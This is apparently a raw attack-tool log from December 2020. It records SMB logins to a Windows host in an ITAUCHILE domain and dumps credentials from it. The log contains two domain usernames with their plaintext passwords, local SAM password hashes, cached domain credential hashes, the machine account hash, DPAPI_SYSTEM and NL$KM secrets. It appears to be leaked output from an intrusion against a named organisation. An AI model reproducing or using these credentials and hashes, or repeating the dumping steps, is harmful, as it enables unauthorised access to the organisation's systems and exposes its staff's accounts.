12-22-2020 18:58:08 [*] PREVIRTUAL015.ITAUCHILE.CL:445 is running Windows 6.1 Build 7601 (name:PREVIRTUAL015) (domain:ITAUCHILE)
12-22-2020 18:58:08 [+] PREVIRTUAL015.ITAUCHILE.CL:445 Login successful ITAUCHILE\CJGO0366:ItaSeg2020
12-22-2020 18:58:13 [+] PREVIRTUAL015.ITAUCHILE.CL:445 Dumping SAM hashes (uid:rid:lmhash:nthash):
12-22-2020 18:58:18 Administrador:500:aad3b435b51404eeaad3b435b51404ee:2390905756031b1c4d9832635f6a2634:::
12-22-2020 18:58:20 Invitado:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
12-22-2020 18:58:22 lcladmin:1003:aad3b435b51404eeaad3b435b51404ee:f46df76f26d027b412c409dc9e90e176:::
12-22-2020 18:58:24 robotics:1004:aad3b435b51404eeaad3b435b51404ee:4a4ce760079cdd47f2b1082f1eae52b3:::
12-22-2020 19:01:06 [*] PREVIRTUAL015.ITAUCHILE.CL:445 is running Windows 6.1 Build 7601 (name:PREVIRTUAL015) (domain:ITAUCHILE)
12-22-2020 19:01:06 [+] PREVIRTUAL015.ITAUCHILE.CL:445 Login successful ITAUCHILE\CJGO0366:ItaSeg2020
12-22-2020 19:01:11 [+] PREVIRTUAL015.ITAUCHILE.CL:445 Dumping LSA secrets:
12-22-2020 19:01:16 CRPA3650:e6df483daab89416cd5c4448a9ec1645:ITAUCHILE.CL:ITAUCHILE:::
12-22-2020 19:01:17 CRPA0780:d06f667bc9adfb0fb21c0acd145612b6:ITAUCHILE.CL:ITAUCHILE:::
12-22-2020 19:01:18 EEAA4651:4878eb5981fba4aa3160a4c92c10f751:ITAUCHILE.CL:ITAUCHILE:::
12-22-2020 19:01:21 ITAUCHILE\PREVIRTUAL015$:aad3b435b51404eeaad3b435b51404ee:5fd226b8fea735d83d49363fd06347e9:::
12-22-2020 19:01:23 DPAPI_SYSTEM:010000001bfc568f0943277d203e0f5b78ad49f094670839363b8544f2f51aafafa19ee7e556874046ea1568
12-22-2020 19:01:24 NL$KM:a22eca6e48e565535b8328cccd2c15895f26ca6cca6cf7f2e53a3724eecbf88942c6be9aab7ffabbc37112bf7ce38396585943897d03792b12317fead758918c
12-22-2020 21:08:44 [*] PREVIRTUAL015.ITAUCHILE.CL:445 is running Windows 6.1 Build 7601 (name:PREVIRTUAL015) (domain:ITAUCHILE)
12-22-2020 21:08:44 [+] PREVIRTUAL015.ITAUCHILE.CL:445 Login successful ITAUCHILE\USR_ROBOTIC:Usr.ROBOT19*
12-22-2020 21:08:49 [+] PREVIRTUAL015.ITAUCHILE.CL:445 Dumping LSA secrets:
12-22-2020 21:08:53 CRPA3650:e6df483daab89416cd5c4448a9ec1645:ITAUCHILE.CL:ITAUCHILE:::
12-22-2020 21:08:54 CRPA0780:d06f667bc9adfb0fb21c0acd145612b6:ITAUCHILE.CL:ITAUCHILE:::
12-22-2020 21:08:56 EEAA4651:4878eb5981fba4aa3160a4c92c10f751:ITAUCHILE.CL:ITAUCHILE:::
12-22-2020 21:08:58 ITAUCHILE\PREVIRTUAL015$:aad3b435b51404eeaad3b435b51404ee:5fd226b8fea735d83d49363fd06347e9:::
12-22-2020 21:09:01 DPAPI_SYSTEM:010000001bfc568f0943277d203e0f5b78ad49f094670839363b8544f2f51aafafa19ee7e556874046ea1568
12-22-2020 21:09:02 NL$KM:a22eca6e48e565535b8328cccd2c15895f26ca6cca6cf7f2e53a3724eecbf88942c6be9aab7ffabbc37112bf7ce38396585943897d03792b12317fead758918c
